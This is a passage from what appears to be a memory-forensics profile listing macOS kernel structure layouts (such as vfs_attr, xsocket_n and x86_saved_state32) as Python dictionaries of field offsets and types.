    'lck_rw_tag': [0x4, ['unsigned int']],
    'lck_rw_pad8': [0x8, ['unsigned int']],
    'lck_rw_pad12': [0xc, ['unsigned int']],
}],
  'vfs_attr': [ 0x120, {
    'f_supported': [0x0, ['unsigned long long']],
    'f_active': [0x8, ['unsigned long long']],
    'f_objcount': [0x10, ['unsigned long long']],
    'f_filecount': [0x18, ['unsigned long long']],
    'f_dircount': [0x20, ['unsigned long long']],
    'f_maxobjcount': [0x28, ['unsigned long long']],
    'f_bsize': [0x30, ['unsigned int']],
    'f_iosize': [0x34, ['unsigned long']],
    'f_blocks': [0x3c, ['unsigned long long']],
    'f_bfree': [0x44, ['unsigned long long']],
    'f_bavail': [0x4c, ['unsigned long long']],
    'f_bused': [0x54, ['unsigned long long']],
    'f_files': [0x5c, ['unsigned long long']],
    'f_ffree': [0x64, ['unsigned long long']],
    'f_fsid': [0x6c, ['fsid']],
    'f_owner': [0x74, ['unsigned int']],
    'f_capabilities': [0x78, ['vol_capabilities_attr']],
    'f_attributes': [0x98, ['vol_attributes_attr']],
    'f_create_time': [0xc0, ['timespec']],
    'f_modify_time': [0xd0, ['timespec']],
    'f_access_time': [0xe0, ['timespec']],
    'f_backup_time': [0xf0, ['timespec']],
    'f_fssubtype': [0x100, ['unsigned int']],
    'f_vol_name': [0x104, ['pointer', ['char']]],
    'f_signature': [0x10c, ['unsigned short']],
    'f_carbon_fsid': [0x10e, ['unsigned short']],
    'f_uuid': [0x110, ['array', 16, ['unsigned char']]],
}],
  '__unnamed_9918721': [ 0x10, {
    'le_next': [0x0, ['pointer', ['secreg']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['secreg']]]],
}],
  'pipe_info': [ 0xa0, {
    'pipe_stat': [0x0, ['vinfo_stat']],
    'pipe_handle': [0x88, ['unsigned long long']],
    'pipe_peerhandle': [0x90, ['unsigned long long']],
    'pipe_status': [0x98, ['int']],
    'rfu_1': [0x9c, ['int']],
}],
  'ext_fsevent_clone_args': [ 0x18, {
    'event_list': [0x0, ['unsigned long long']],
    'num_events': [0x8, ['int']],
    'event_queue_depth': [0xc, ['int']],
    'fd': [0x10, ['unsigned long long']],
}],
  'attr_info': [ 0x60, {
    'context': [0x0, ['pointer', ['vfs_context']]],
    'filevp': [0x8, ['pointer', ['vnode']]],
    'filesize': [0x10, ['unsigned long']],
    'iosize': [0x18, ['unsigned long']],
    'rawdata': [0x20, ['pointer', ['unsigned char']]],
    'rawsize': [0x28, ['unsigned long']],
    'filehdr': [0x30, ['pointer', ['apple_double_header']]],
    'finderinfo': [0x38, ['pointer', ['apple_double_entry']]],
    'rsrcfork': [0x40, ['pointer', ['apple_double_entry']]],
    'attrhdr': [0x48, ['pointer', ['attr_header']]],
    'attr_entry': [0x50, ['pointer', ['attr_entry']]],
    'readonly': [0x58, ['unsigned char']],
    'emptyfinderinfo': [0x59, ['unsigned char']],
}],
  'fq6_head': [ 0x10, {
    'mq_first': [0x0, ['pointer', ['mbuf']]],
    'mq_last': [0x8, ['pointer', ['pointer', ['mbuf']]]],
}],
  'ifmultiaddr': [ 0x60, {
    'ifma_lock': [0x0, ['__unnamed_12877919']],
    'ifma_refcount': [0x10, ['unsigned int']],
    'ifma_anoncnt': [0x14, ['unsigned int']],
    'ifma_reqcnt': [0x18, ['unsigned int']],
    'ifma_debug': [0x1c, ['unsigned int']],
    'ifma_flags': [0x20, ['unsigned int']],
    'ifma_link': [0x28, ['__unnamed_12882377']],
    'ifma_addr': [0x38, ['pointer', ['sockaddr']]],
    'ifma_ll': [0x40, ['pointer', ['ifmultiaddr']]],
    'ifma_ifp': [0x48, ['pointer', ['ifnet']]],
    'ifma_protospec': [0x50, ['pointer', ['void']]],
    'ifma_trace': [0x58, ['pointer', ['void']]],
}],
  'posix_spawn_args': [ 0x28, {
    'pid': [0x0, ['unsigned long long']],
    'pid_l_': [0x0, ['array', 0, ['char']]],
    'path_l_': [0x8, ['array', 0, ['char']]],
    'pid_r_': [0x8, ['array', 0, ['char']]],
    'path': [0x8, ['unsigned long long']],
    'path_r_': [0x10, ['array', 0, ['char']]],
    'adesc': [0x10, ['unsigned long long']],
    'adesc_l_': [0x10, ['array', 0, ['char']]],
    'adesc_r_': [0x18, ['array', 0, ['char']]],
    'argv': [0x18, ['unsigned long long']],
    'argv_l_': [0x18, ['array', 0, ['char']]],
    'envp': [0x20, ['unsigned long long']],
    'argv_r_': [0x20, ['array', 0, ['char']]],
    'envp_l_': [0x20, ['array', 0, ['char']]],
    'envp_r_': [0x28, ['array', 0, ['char']]],
}],
  '__unnamed_5388464': [ 0x10, {
    'opaque': [0x0, ['array', 2, ['unsigned long']]],
}],
  'xsocket_n': [ 0x44, {
    'xso_len': [0x0, ['unsigned int']],
    'xso_kind': [0x4, ['unsigned int']],
    'xso_so': [0x8, ['unsigned long long']],
    'so_type': [0x10, ['short']],
    'so_options': [0x14, ['unsigned int']],
    'so_linger': [0x18, ['short']],
    'so_state': [0x1a, ['short']],
    'so_pcb': [0x1c, ['unsigned long long']],
    'xso_protocol': [0x24, ['int']],
    'xso_family': [0x28, ['int']],
    'so_qlen': [0x2c, ['short']],
    'so_incqlen': [0x2e, ['short']],
    'so_qlimit': [0x30, ['short']],
    'so_timeo': [0x32, ['short']],
    'so_error': [0x34, ['unsigned short']],
    'so_pgid': [0x38, ['int']],
    'so_oobmark': [0x3c, ['unsigned int']],
    'so_uid': [0x40, ['unsigned int']],
}],
  'kauth_identity_extlookup': [ 0x130, {
    'el_seqno': [0x0, ['unsigned int']],
    'el_result': [0x4, ['unsigned int']],
    'el_flags': [0x8, ['unsigned int']],
    'el_info_pid': [0xc, ['int']],
    'el_extend': [0x10, ['unsigned long long']],
    'el_info_reserved_1': [0x18, ['unsigned int']],
    'el_uid': [0x1c, ['unsigned int']],
    'el_uguid': [0x20, ['__unnamed_11029183']],
    'el_uguid_valid': [0x30, ['unsigned int']],
    'el_usid': [0x34, ['__unnamed_11029238']],
    'el_usid_valid': [0x7c, ['unsigned int']],
    'el_gid': [0x80, ['unsigned int']],
    'el_gguid': [0x84, ['__unnamed_11029183']],
    'el_gguid_valid': [0x94, ['unsigned int']],
    'el_gsid': [0x98, ['__unnamed_11029238']],
    'el_gsid_valid': [0xe0, ['unsigned int']],
    'el_member_valid': [0xe4, ['unsigned int']],
    'el_sup_grp_cnt': [0xe8, ['unsigned int']],
    'el_sup_groups': [0xec, ['array', 16, ['unsigned int']]],
}],
  'au_qctrl': [ 0x14, {
    'aq_hiwater': [0x0, ['int']],
    'aq_lowater': [0x4, ['int']],
    'aq_bufsz': [0x8, ['int']],
    'aq_delay': [0xc, ['int']],
    'aq_minfree': [0x10, ['int']],
}],
  'vm_info_region_64': [ 0x2c, {
    'vir_start': [0x0, ['unsigned int']],
    'vir_end': [0x4, ['unsigned int']],
    'vir_object': [0x8, ['unsigned int']],
    'vir_offset': [0xc, ['unsigned long long']],
    'vir_needs_copy': [0x14, ['int']],
    'vir_protection': [0x18, ['int']],
    'vir_max_protection': [0x1c, ['int']],
    'vir_inheritance': [0x20, ['unsigned int']],
    'vir_wired_count': [0x24, ['unsigned int']],
    'vir_user_wired_count': [0x28, ['unsigned int']],
}],
  '_ipfw_dyn_rule': [ 0x78, {
    'next': [0x0, ['pointer', ['_ipfw_dyn_rule']]],
    'rule': [0x8, ['pointer', ['ip_fw']]],
    'parent': [0x10, ['pointer', ['_ipfw_dyn_rule']]],
    'pcnt': [0x18, ['unsigned long long']],
    'bcnt': [0x20, ['unsigned long long']],
    'id': [0x28, ['ip_flow_id']],
    'expire': [0x60, ['unsigned int']],
    'bucket': [0x64, ['unsigned int']],
    'state': [0x68, ['unsigned int']],
    'ack_fwd': [0x6c, ['unsigned int']],
    'ack_rev': [0x70, ['unsigned int']],
    'dyn_type': [0x74, ['unsigned short']],
    'count': [0x76, ['unsigned short']],
}],
  'HFSPlusCatalogThread': [ 0x208, {
    'recordType': [0x0, ['short']],
    'reserved': [0x2, ['short']],
    'parentID': [0x4, ['unsigned int']],
    'nodeName': [0x8, ['HFSUniStr255']],
}],
  'fairq_classstats': [ 0x2b8, {
    'class_handle': [0x0, ['unsigned int']],
    'priority': [0x4, ['unsigned int']],
    'qlength': [0x8, ['unsigned int']],
    'qlimit': [0xc, ['unsigned int']],
    'xmit_cnt': [0x10, ['pktcntr']],
    'drop_cnt': [0x20, ['pktcntr']],
    'qtype': [0x30, ['Enumeration', {'target': 'int', 'choices': {0: 'Q_DROPHEAD', 1: 'Q_DROPTAIL', 2: 'Q_RED', 3: 'Q_RIO', 4: 'Q_BLUE', 5: 'Q_SFB'}}]],
    '__unnamed_7806378': [0x38, ['__unnamed_7806327']],
    'qstate': [0x2b0, ['Enumeration', {'target': 'int', 'choices': {0: 'QS_RUNNING', 1: 'QS_SUSPENDED'}}]],
}],
  '__unnamed_5428497': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['nfsnode']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['nfsnode']]]],
}],
  'bstp_timer': [ 0xc, {
    'active': [0x0, ['int']],
    'latched': [0x4, ['int']],
    'value': [0x8, ['int']],
}],
  '__unnamed_8620573': [ 0x4, {
    'ih_gwaddr': [0x0, ['in_addr']],
    'ih_void': [0x0, ['int']],
    'ih_pmtu': [0x0, ['ih_pmtu']],
    'ih_rtradv': [0x0, ['ih_rtradv']],
    'ih_pptr': [0x0, ['unsigned char']],
    'ih_idseq': [0x0, ['ih_idseq']],
}],
  'sigval': [ 0x8, {
    'sival_int': [0x0, ['int']],
    'sival_ptr': [0x0, ['pointer', ['void']]],
}],
  'bqueues': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['buf']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['buf']]]],
}],
  'lockstat_assembly_probe': [ 0x10, {
    'lsap_probe': [0x0, ['int']],
    'lsap_patch_point': [0x8, ['pointer', ['unsigned long']]],
}],
  'pktcntr': [ 0x10, {
    'packets': [0x0, ['unsigned long long']],
    'bytes': [0x8, ['unsigned long long']],
}],
  'IOSharedDataQueue_class': [ 0x28, {
    'gMetaClass': [0x0, ['MetaClass_class']],
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    '_reserved': [0x20, ['pointer', ['ExpansionData']]],
}],
  'xcpmio_pstate': [ 0x10, {
    'pst_id': [0x0, ['unsigned int']],
    'pst_freq': [0x4, ['unsigned int']],
    'pst_voltage': [0x8, ['unsigned int']],
    'pst_max_cores_turbo': [0xc, ['unsigned int']],
}],
  'rt_addrinfo': [ 0x48, {
    'rti_addrs': [0x0, ['int']],
    'rti_info': [0x8, ['array', 8, ['pointer', ['sockaddr']]]],
}],
  '__unnamed_5344749': [ 0x10, {
    'le_next': [0x0, ['pointer', ['nfs_exportfs']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['nfs_exportfs']]]],
}],
  'l_util': [ 0x4, {
    's': [0x0, ['array', 2, ['unsigned short']]],
    'l': [0x0, ['unsigned int']],
}],
  'nfsrv_export_hashhead': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['nfs_export']]],
}],
  'vnop_kqfilt_remove_args': [ 0x20, {
    'a_desc': [0x0, ['pointer', ['vnodeop_desc']]],
    'a_vp': [0x8, ['pointer', ['vnode']]],
    'a_ident': [0x10, ['unsigned long']],
    'a_context': [0x18, ['pointer', ['vfs_context']]],
}],
  'cchmac_ctx': [ 0x8, {
    'b': [0x0, ['array', 8, ['unsigned char']]],
}],
  'ipc_mqueue': [ 0x48, {
    'data': [0x0, ['__unnamed_4564964']],
}],
  'pf_pptp_state': [ 0x8, {
    'grev1_state': [0x0, ['pointer', ['pf_state']]],
}],
  'pshm_info': [ 0x490, {
    'pshm_stat': [0x0, ['vinfo_stat']],
    'pshm_mappaddr': [0x88, ['unsigned long long']],
    'pshm_name': [0x90, ['array', 1024, ['char']]],
}],
  'swapfile_pager': [ 0x40, {
    'pager_header': [0x0, ['ipc_object_header']],
    'pager_ops': [0x8, ['pointer', ['memory_object_pager_ops']]],
    'pager_queue': [0x10, ['queue_entry']],
    'ref_count': [0x20, ['unsigned int']],
    'is_ready': [0x24, ['int']],
    'is_mapped': [0x28, ['int']],
    'pager_control': [0x30, ['pointer', ['memory_object_control']]],
    'swapfile_vnode': [0x38, ['pointer', ['vnode']]],
}],
  'x86_saved_state32': [ 0x4c, {
    'gs': [0x0, ['unsigned int']],
    'fs': [0x4, ['unsigned int']],
    'es': [0x8, ['unsigned int']],
    'ds': [0xc, ['unsigned int']],
    'edi': [0x10, ['unsigned int']],
    'esi': [0x14, ['unsigned int']],
    'ebp': [0x18, ['unsigned int']],
    'cr2': [0x1c, ['unsigned int']],
    'ebx': [0x20, ['unsigned int']],
    'edx': [0x24, ['unsigned int']],
    'ecx': [0x28, ['unsigned int']],
    'eax': [0x2c, ['unsigned int']],
    'trapno': [0x30, ['unsigned short']],
    'cpu': [0x32, ['unsigned short']],
    'err': [0x34, ['unsigned int']],
    'eip': [0x38, ['unsigned int']],
    'cs': [0x3c, ['unsigned int']],
    'efl': [0x40, ['unsigned int']],
    'uesp': [0x44, ['unsigned int']],
    'ss': [0x48, ['unsigned int']],
}],
  'munlock_args': [ 0x10, {
    'addr': [0x0, ['unsigned long long']],
    'addr_l_': [0x0, ['array', 0, ['char']]],
    'addr_r_': [0x8, ['array', 0, ['char']]],
    'len': [0x8, ['unsigned long long']],
    'len_l_': [0x8, ['array', 0, ['char']]],
    'len_r_': [0x10, ['array', 0, ['char']]],
}],
  'cat_lookup_buffer': [ 0x170, {
    'lookup_desc': [0x0, ['cat_desc']],
    'lookup_attr': [0x18, ['cat_attr']],
    'lookup_fork': [0x90, ['filefork']],
    'lookup_cn': [0x110, ['componentname']],
    'lookup_name': [0x150, ['array', 32, ['char']]],
}],
  'in4in6_addr': [ 0x10, {
    'i46a_pad32': [0x0, ['array', 3, ['unsigned int']]],
    'i46a_addr4': [0xc, ['in_addr']],
}],
  'fchown_args': [ 0x18, {
    'fd_l_': [0x0, ['array', 0, ['char']]],
    'fd': [0x0, ['int']],
    'fd_r_': [0x4, ['array', 4, ['char']]],
    'uid': [0x8, ['int']],
    'uid_l_': [0x8, ['array', 0, ['char']]],
    'uid_r_': [0xc, ['array', 4, ['char']]],
    'gid': [0x10, ['int']],
    'gid_l_': [0x10, ['array', 0, ['char']]],
    'gid_r_': [0x14, ['array', 4, ['char']]],
}],
  'shmid_kernel': [ 0x58, {
    'u': [0x0, ['user_shmid_ds']],
    'label': [0x50, ['pointer', ['label']]],
}],
  '__unnamed_7511852': [ 0x8, {
    'sle_next': [0x0, ['pointer', ['pf_os_fingerprint']]],
}],
  'read_args': [ 0x18, {
    'fd_l_': [0x0, ['array', 0, ['char']]],
    'fd': [0x0, ['int']],
    'fd_r_': [0x4, ['array', 4, ['char']]],
    'cbuf_l_': [0x8, ['array', 0, ['char']]],
    'cbuf': [0x8, ['unsigned long long']],
    'nbyte_l_': [0x10, ['array', 0, ['char']]],
    'cbuf_r_': [0x10, ['array', 0, ['char']]],
    'nbyte': [0x10, ['unsigned long long']],
    'nbyte_r_': [0x18, ['array', 0, ['char']]],
}],
  'dtrace_helper_action': [ 0x20, {
    'dtha_generation': [0x0, ['int']],
    'dtha_nactions': [0x4, ['int']],
    'dtha_predicate': [0x8, ['pointer', ['dtrace_difo']]],
    'dtha_actions': [0x10, ['pointer', ['pointer', ['dtrace_difo']]]],
    'dtha_next': [0x18, ['pointer', ['dtrace_helper_action']]],
}],
  '_select': [ 0x20, {
    'ibits': [0x0, ['pointer', ['unsigned int']]],
    'obits': [0x8, ['pointer', ['unsigned int']]],
    'nbytes': [0x10, ['unsigned int']],
    'data': [0x18, ['pointer', ['_select_data']]],
}],
  'nfs_sillyrename': [ 0x28, {
    'nsr_cred': [0x0, ['pointer', ['ucred']]],
    'nsr_dnp': [0x8, ['pointer', ['nfsnode']]],
    'nsr_namlen': [0x10, ['int']],
    'nsr_name': [0x14, ['array', 20, ['char']]],
}],
  'update_state': [ 0x28, {
    's_desc': [0x0, ['pointer', ['cat_desc']]],
    's_attr': [0x8, ['pointer', ['cat_attr']]],
    's_datafork': [0x10, ['pointer', ['cat_fork']]],
    's_rsrcfork': [0x18, ['pointer', ['cat_fork']]],
    's_hfsmp': [0x20, ['pointer', ['hfsmount']]],
}],
  'initgroups_args': [ 0x18, {
    'gidsetsize': [0x0, ['unsigned int']],
    'gidsetsize_l_': [0x0, ['array', 0, ['char']]],
    'gidsetsize_r_': [0x4, ['array', 4, ['char']]],
    'gidset_l_': [0x8, ['array', 0, ['char']]],
    'gidset': [0x8, ['unsigned long long']],
    'gidset_r_': [0x10, ['array', 0, ['char']]],
    'gmuid': [0x10, ['int']],
    'gmuid_l_': [0x10, ['array', 0, ['char']]],
    'gmuid_r_': [0x14, ['array', 4, ['char']]],
}],
  'vm_page_delayed_work': [ 0x10, {
    'dw_m': [0x0, ['pointer', ['vm_page']]],
    'dw_mask': [0x8, ['int']],
}],
  'getattrlist_attrtab': [ 0x20, {
    'attr': [0x0, ['unsigned int']],
    'bits': [0x8, ['unsigned long long']],
    'size': [0x10, ['long']],
    'action': [0x18, ['int']],
}],
  'kmzones': [ 0x18, {
    'kz_elemsize': [0x0, ['unsigned long']],
    'kz_zalloczone': [0x8, ['pointer', ['void']]],
    'kz_noencrypt': [0x10, ['int']],
}],
  'stringhead': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['string_t']]],
}],
  'wait_queue_element': [ 0x20, {
    'wqe_links': [0x0, ['queue_entry']],
    'wqe_type': [0x10, ['pointer', ['void']]],
    'wqe_queue': [0x18, ['pointer', ['wait_queue']]],
}],
  'kxld_array': [ 0x30, {
    'pools': [0x0, ['kxld_array_head']],
    'itemsize': [0x10, ['unsigned long']],
    'pool_capacity': [0x18, ['unsigned long']],
    'pool_maxitems': [0x20, ['unsigned int']],
    'nitems': [0x24, ['unsigned int']],
    'maxitems': [0x28, ['unsigned int']],
    'npools': [0x2c, ['unsigned int']],
}],
  'ipfw_flow_id': [ 0x10, {
    'dst_ip': [0x0, ['unsigned int']],
    'src_ip': [0x4, ['unsigned int']],
    'dst_port': [0x8, ['unsigned short']],
    'src_port': [0xa, ['unsigned short']],
    'proto': [0xc, ['unsigned char']],
    'flags': [0xd, ['unsigned char']],
}],
  'x86_core': [ 0x50, {
    'next_in_die': [0x0, ['pointer', ['x86_core']]],
    'next_in_pkg': [0x8, ['pointer', ['x86_core']]],
    'die': [0x10, ['pointer', ['x86_die']]],
    'package': [0x18, ['pointer', ['x86_pkg']]],
    'lcpus': [0x20, ['pointer', ['x86_lcpu']]],
    'flags': [0x28, ['unsigned int']],
    'lcore_num': [0x2c, ['unsigned int']],
    'pcore_num': [0x30, ['unsigned int']],
    'num_lcpus': [0x34, ['unsigned int']],
    'active_lcpus': [0x38, ['unsigned int']],
    'pmStats': [0x40, ['pointer', ['void']]],
    'pmState': [0x48, ['pointer', ['void']]],
}],
  'utun_crypto_kpi_reg': [ 0x18, {
    'crypto_kpi_type': [0x0, ['Enumeration', {'target': 'int', 'choices': {1: 'UTUN_CRYPTO_TYPE_IPSEC', 2: 'UTUN_CRYPTO_TYPE_DTLS', 3: 'UTUN_CRYPTO_TYPE_MAX'}}]],
    'crypto_kpi_flags': [0x4, ['unsigned int']],
    'crypto_kpi_connect': [0x8, ['pointer', ['void']]],
    'crypto_kpi_send': [0x10, ['pointer', ['void']]],
}],
  'in6_nbrinfo_32': [ 0x30, {
    'ifname': [0x0, ['array', 16, ['char']]],
    'addr': [0x10, ['in6_addr']],
    'asked': [0x20, ['unsigned int']],
    'isrouter': [0x24, ['int']],
    'state': [0x28, ['int']],
    'expire': [0x2c, ['int']],
}],
  'au_session': [ 0x10, {
    'as_aia_p': [0x0, ['pointer', ['auditinfo_addr']]],
    'as_mask': [0x8, ['au_mask']],
}],
  'ip6ctlparam': [ 0x48, {
    'ip6c_m': [0x0, ['pointer', ['mbuf']]],
    'ip6c_icmp6': [0x8, ['pointer', ['icmp6_hdr']]],
    'ip6c_ip6': [0x10, ['pointer', ['ip6_hdr']]],
    'ip6c_off': [0x18, ['int']],
    'ip6c_src': [0x20, ['pointer', ['sockaddr_in6']]],
    'ip6c_dst': [0x28, ['pointer', ['sockaddr_in6']]],
    'ip6c_finaldst': [0x30, ['pointer', ['in6_addr']]],
    'ip6c_cmdarg': [0x38, ['pointer', ['void']]],
    'ip6c_nxt': [0x40, ['unsigned char']],
}],
  'vm_map_header': [ 0x40, {
    'links': [0x0, ['vm_map_links']],
    'nentries': [0x20, ['int']],
    'entries_pageable': [0x24, ['int']],
    'highest_entry_end_addr': [0x28, ['unsigned long long']],
    'rb_head_store': [0x30, ['rb_head']],
    'page_shift': [0x38, ['int']],
}],
  'vnop_mknod_args': [ 0x30, {
    'a_desc': [0x0, ['pointer', ['vnodeop_desc']]],
    'a_dvp': [0x8, ['pointer', ['vnode']]],
    'a_vpp': [0x10, ['pointer', ['pointer', ['vnode']]]],
    'a_cnp': [0x18, ['pointer', ['componentname']]],
    'a_vap': [0x20, ['pointer', ['vnode_attr']]],
    'a_context': [0x28, ['pointer', ['vfs_context']]],
}],
  'aio_anchor_cb': [ 0x40, {
    'aio_inflight_count': [0x0, ['int']],
    'aio_done_count': [0x4, ['int']],
    'aio_total_count': [0x8, ['int']],
    'aio_num_workqs': [0xc, ['int']],
    'aio_async_workqs': [0x10, ['array', 1, ['aio_workq']]],
}],
  'ledger_entry': [ 0x38, {
    'le_flags': [0x0, ['unsigned int']],
    'le_limit': [0x8, ['long long']],
    'le_warn_level': [0x10, ['long long']],
    'le_credit': [0x18, ['long long']],
    'le_debit': [0x20, ['long long']],
    '_le': [0x28, ['__unnamed_996828']],
}],
  'sha1_ctxt': [ 0x68, {
    'h': [0x0, ['__unnamed_15396248']],
    'c': [0x18, ['__unnamed_15396314']],
    'm': [0x20, ['__unnamed_15396395']],
    'count': [0x60, ['unsigned char']],
}],
  'mcache': [ 0x1c0, {
    'mc_list': [0x0, ['__unnamed_11988625']],
    'mc_name': [0x10, ['array', 32, ['char']]],
    'mc_slab_zone': [0x30, ['pointer', ['zone']]],
    'mc_slab_alloc': [0x38, ['pointer', ['void']]],
    'mc_slab_free': [0x40, ['pointer', ['void']]],
    'mc_slab_audit': [0x48, ['pointer', ['void']]],
    'mc_slab_log': [0x50, ['pointer', ['void']]],
    'mc_slab_notify': [0x58, ['pointer', ['void']]],
    'mc_private': [0x60, ['pointer', ['void']]],
    'mc_bufsize': [0x68, ['unsigned long']],
    'mc_align': [0x70, ['unsigned long']],
    'mc_flags': [0x78, ['unsigned int']],
    'mc_purge_cnt': [0x7c, ['unsigned int']],
    'mc_enable_cnt': [0x80, ['unsigned int']],
    'mc_waiter_cnt': [0x84, ['unsigned int']],
    'mc_wretry_cnt': [0x88, ['unsigned int']],
    'mc_nwretry_cnt': [0x8c, ['unsigned int']],
    'mc_nwfail_cnt': [0x90, ['unsigned int']],
    'mc_sync_lock': [0x98, ['__unnamed_11979823']],
    'mc_sync_lock_attr': [0xa8, ['pointer', ['__lck_attr__']]],
    'mc_sync_lock_grp': [0xb0, ['pointer', ['__lck_grp__']]],
    'mc_sync_lock_grp_attr': [0xb8, ['pointer', ['__lck_grp_attr__']]],
    'mc_cpu_lock_attr': [0xc0, ['pointer', ['__lck_attr__']]],
    'mc_cpu_lock_grp': [0xc8, ['pointer', ['__lck_grp__']]],
    'mc_cpu_lock_grp_attr': [0xd0, ['pointer', ['__lck_grp_attr__']]],
    'mc_bkt_lock': [0xd8, ['__unnamed_11979823']],
    'mc_bkt_lock_attr': [0xe8, ['pointer', ['__lck_attr__']]],
    'mc_bkt_lock_grp': [0xf0, ['pointer', ['__lck_grp__']]],
    'mc_bkt_lock_grp_attr': [0xf8, ['pointer', ['__lck_grp_attr__']]],
    'cache_bkttype': [0x100, ['pointer', ['mcache_bkttype']]],
    'mc_full': [0x108, ['mcache_bktlist']],
    'mc_empty': [0x128, ['mcache_bktlist']],
    'mc_chunksize': [0x148, ['unsigned long']],
    'mc_bkt_contention': [0x150, ['unsigned int']],
    'mc_bkt_contention_prev': [0x154, ['unsigned int']],
    'mc_cpu': [0x180, ['array', 1, ['mcache_cpu']]],
}],
  '__unnamed_6212677': [ 0x10, {
    'opaque': [0x0, ['array', 2, ['unsigned long']]],
}],
  'user_ldt': [ 0x8, {
    'start': [0x0, ['unsigned int']],
    'count': [0x4, ['unsigned int']],
    'ldt': [0x8, ['array', 0, ['real_descriptor']]],
}],
  'ifnet_addr_list': [ 0x10, {
    'ifal_le': [0x0, ['__unnamed_7120405']],
    'ifal_ifa': [0x8, ['pointer', ['ifaddr']]],
}],
  'nstat_route_add_param': [ 0x3c, {
    'dst': [0x0, ['__unnamed_7034809']],
    'mask': [0x1c, ['__unnamed_7034859']],
    'ifindex': [0x38, ['unsigned int']],
}],
  'segment_command': [ 0x38, {
    'cmd': [0x0, ['unsigned int']],
    'cmdsize': [0x4, ['unsigned int']],
    'segname': [0x8, ['array', 16, ['char']]],
    'vmaddr': [0x18, ['unsigned int']],
    'vmsize': [0x1c, ['unsigned int']],
    'fileoff': [0x20, ['unsigned int']],
    'filesize': [0x24, ['unsigned int']],
    'maxprot': [0x28, ['int']],
    'initprot': [0x2c, ['int']],
    'nsects': [0x30, ['unsigned int']],
    'flags': [0x34, ['unsigned int']],
}],
  'pf_rule_addr': [ 0x40, {
    'addr': [0x0, ['pf_addr_wrap']],
    'xport': [0x30, ['pf_rule_xport']],
    'neg': [0x38, ['unsigned char']],
}],
  'uidinfo': [ 0x20, {
    'ui_hash': [0x0, ['__unnamed_11403850']],
    'ui_uid': [0x10, ['unsigned int']],
    'ui_proccnt': [0x18, ['long']],
}],
  'flock': [ 0x18, {
    'l_start': [0x0, ['long long']],
    'l_len': [0x8, ['long long']],
    'l_pid': [0x10, ['int']],
    'l_type': [0x14, ['short']],
    'l_whence': [0x16, ['short']],
}],
  'kperf_sample': [ 0xa68, {
    'threadinfo': [0x0, ['threadinfo']],
    'tinfo_ex': [0x20, ['tinfo_ex']],
    'kcallstack': [0x38, ['callstack']],
    'ucallstack': [0x440, ['callstack']],
    'kpcdata': [0x848, ['kpcdata']],
}],
  'hibernate_cryptwakevars_t': [ 0x10, {
    'aes_iv': [0x0, ['array', 16, ['unsigned char']]],
}],
  '__SC_Scatter': [ 0x18, {
    'count': [0x0, ['unsigned int']],
    'base': [0x4, ['unsigned int']],
    'targetOffset': [0x8, ['unsigned long long']],
    'spare': [0x10, ['unsigned long long']],
}],
  'default_pager_info_64': [ 0x20, {
    'dpi_total_space': [0x0, ['unsigned long long']],
    'dpi_free_space': [0x8, ['unsigned long long']],
    'dpi_page_size': [0x10, ['unsigned long']],
    'dpi_flags': [0x18, ['int']],
}],
  'nfsiodlist': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['nfsiod']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['nfsiod']]]],
}],
  '__unnamed_7487482': [ 0x8, {
    'fru_queue': [0x0, ['pf_fragq']],
    'fru_cache': [0x0, ['pf_cacheq']],
}],
  'stf_softc': [ 0x68, {
    'sc_if': [0x0, ['pointer', ['ifnet']]],
    'sc_protocol_family': [0x8, ['unsigned int']],
    '__sc_ro46': [0x10, ['__unnamed_7090935']],
    'sc_ro_mtx': [0x40, ['__unnamed_7064674']],
    'encap_cookie': [0x50, ['pointer', ['encaptab']]],
    'tap_mode': [0x58, ['unsigned int']],
    'tap_callback': [0x60, ['pointer', ['void']]],
}],
  'send_queue_head': [ 0x10, {
    'mq_first': [0x0, ['pointer', ['mbuf']]],
    'mq_last': [0x8, ['pointer', ['pointer', ['mbuf']]]],
}],
  'IOInterruptEventSource_class': [ 0x68, {
    'gMetaClass': [0x0, ['MetaClass_class']],
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'provider': [0x48, ['pointer', ['IOService_class']]],
    'intIndex': [0x50, ['int']],
    'producerCount': [0x54, ['unsigned int']],
    'consumerCount': [0x58, ['unsigned int']],
    'autoDisable': [0x5c, ['int']],
    'explicitDisable': [0x5d, ['int']],
    'reserved': [0x60, ['pointer', ['ExpansionData']]],
}],
  'IOMDDMAWalkSegmentArgs': [ 0x20, {
    'fOffset': [0x0, ['unsigned long long']],
    'fIOVMAddr': [0x8, ['unsigned long long']],
    'fLength': [0x10, ['unsigned long long']],
    'fMapped': [0x18, ['unsigned char']],
}],
  '__unnamed_4570492': [ 0x8, {
    'timestamp': [0x0, ['unsigned int']],
    'destination': [0x0, ['pointer', ['ipc_port']]],
    'receiver': [0x0, ['pointer', ['ipc_space']]],
}],
  'IOStatisticsKextIdentifier': [ 0x40, {
    'identifier': [0x0, ['array', 64, ['char']]],
}],
  'sockaddr_union': [ 0x1c, {
    'sin6': [0x0, ['sockaddr_in6']],
    'sa': [0x0, ['sockaddr']],
    'sin': [0x0, ['sockaddr_in']],
}],
  'sadb_lifetime': [ 0x20, {
    'sadb_lifetime_len': [0x0, ['unsigned short']],
    'sadb_lifetime_exttype': [0x2, ['unsigned short']],
    'sadb_lifetime_allocations': [0x4, ['unsigned int']],
    'sadb_lifetime_bytes': [0x8, ['unsigned long long']],
    'sadb_lifetime_addtime': [0x10, ['unsigned long long']],
    'sadb_lifetime_usetime': [0x18, ['unsigned long long']],
}],
  'quotactl_args': [ 0x20, {
    'path_l_': [0x0, ['array', 0, ['char']]],
    'path': [0x0, ['unsigned long long']],
    'path_r_': [0x8, ['array', 0, ['char']]],
    'cmd': [0x8, ['int']],
    'cmd_l_': [0x8, ['array', 0, ['char']]],
    'cmd_r_': [0xc, ['array', 4, ['char']]],
